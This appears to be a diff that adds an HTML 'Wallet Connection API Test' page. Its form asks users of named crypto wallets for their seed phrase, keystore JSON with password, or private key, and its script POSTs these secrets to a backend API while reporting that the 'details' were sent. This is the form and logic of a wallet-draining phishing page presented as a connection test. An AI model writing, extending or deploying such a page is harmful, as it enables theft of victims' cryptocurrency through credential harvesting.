@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connection API Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .form-container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        textarea {
+            height: 100px;
+        }
+        button {
+            background-color: #4a90e2;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #357abf;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Wallet Connection API Test</h1>
+    <div class="form-container">
+        <div class="form-group">
+            <label for="walletType">Wallet Type</label>
+            <select id="walletType" required>
+                <option value="">Select Wallet Type</option>
+                <option value="Metamask">Metamask</option>
+                <option value="Trust Wallet">Trust Wallet</option>
+                <option value="Coinbase">Coinbase</option>
+                <option value="Keplr Wallet">Keplr Wallet</option>
+                <option value="Safepal">Safepal</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="accessType">Access Type</label>
+            <select id="accessType" required>
+                <option value="">Select Access Type</option>
+                <option value="Phrase">Phrase</option>
+                <option value="Keystore JSON">Keystore JSON</option>
+                <option value="Private Key">Private Key</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="selectedService">Selected Service</label>
+            <input type="text" id="selectedService" value="Wallet Connection Test" required>
+        </div>
+        
+        <div id="phraseContainer" class="form-group hidden">
+            <label for="phrase">Seed Phrase</label>
+            <textarea id="phrase" placeholder="Enter your seed phrase..."></textarea>
+        </div>
+        
+        <div id="keystoreContainer" class="hidden">
+            <div class="form-group">
+                <label for="keystoreJson">Keystore JSON</label>
+                <textarea id="keystoreJson" placeholder="Enter your keystore JSON..."></textarea>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password...">
+            </div>
+        </div>
+        
+        <div id="privateKeyContainer" class="form-group hidden">
+            <label for="privateKey">Private Key</label>
+            <input type="password" id="privateKey" placeholder="Enter your private key...">
+        </div>
+        
+        <button id="submitBtn">Test Connection</button>
+        
+        <div id="result" class="hidden"></div>
+    </div>
+    
+    <script>
+        // Show/hide different input fields based on access type selection
+        document.getElementById('accessType').addEventListener('change', function() {
+            const accessType = this.value;
+            document.getElementById('phraseContainer').classList.add('hidden');
+            document.getElementById('keystoreContainer').classList.add('hidden');
+            document.getElementById('privateKeyContainer').classList.add('hidden');
+            
+            if (accessType === 'Phrase') {
+                document.getElementById('phraseContainer').classList.remove('hidden');
+            } else if (accessType === 'Keystore JSON') {
+                document.getElementById('keystoreContainer').classList.remove('hidden');
+            } else if (accessType === 'Private Key') {
+                document.getElementById('privateKeyContainer').classList.remove('hidden');
+            }
+        });
+        
+        // Form submission
+        document.getElementById('submitBtn').addEventListener('click', async function() {
+            const walletType = document.getElementById('walletType').value;
+            const accessType = document.getElementById('accessType').value;
+            const selectedService = document.getElementById('selectedService').value;
+            const resultDiv = document.getElementById('result');
+            
+            // Validation
+            if (!walletType || !accessType || !selectedService) {
+                resultDiv.textContent = 'Please fill in all required fields';
+                resultDiv.className = 'error';
+                resultDiv.classList.remove('hidden');
+                return;
+            }
+            
+            // Prepare data based on access type
+            let walletData = {
+                walletType,
+                accessType,
+                selectedService,
+                phrase: '',
+                keystoreJson: '',
+                password: '',
+                privateKey: ''
+            };
+            
+            if (accessType === 'Phrase') {
+                walletData.phrase = document.getElementById('phrase').value;
+                if (!walletData.phrase) {
+                    resultDiv.textContent = 'Please enter your seed phrase';
+                    resultDiv.className = 'error';
+                    resultDiv.classList.remove('hidden');
+                    return;
+                }
+            } else if (accessType === 'Keystore JSON') {
+                walletData.keystoreJson = document.getElementById('keystoreJson').value;
+                walletData.password = document.getElementById('password').value;
+                if (!walletData.keystoreJson || !walletData.password) {
+                    resultDiv.textContent = 'Please enter both keystore JSON and password';
+                    resultDiv.className = 'error';
+                    resultDiv.classList.remove('hidden');
+                    return;
+                }
+            } else if (accessType === 'Private Key') {
+                walletData.privateKey = document.getElementById('privateKey').value;
+                if (!walletData.privateKey) {
+                    resultDiv.textContent = 'Please enter your private key';
+                    resultDiv.className = 'error';
+                    resultDiv.classList.remove('hidden');
+                    return;
+                }
+            }
+            
+            try {
+                // Show loading state
+                document.getElementById('submitBtn').textContent = 'Sending...';
+                document.getElementById('submitBtn').disabled = true;
+                
+                // Send API request
+                const response = await fetch('http://localhost:3001/api/connect-wallet', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(walletData)
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    resultDiv.textContent = 'Wallet connection details sent successfully!';
+                    resultDiv.className = 'success';
+                } else {
+                    throw new Error(data.message || 'Failed to connect wallet');
+                }
+            } catch (error) {
+                resultDiv.textContent = `Error: ${error.message}`;
+                resultDiv.className = 'error';
+            } finally {
+                resultDiv.classList.remove('hidden');
+                document.getElementById('submitBtn').textContent = 'Test Connection';
+                document.getElementById('submitBtn').disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
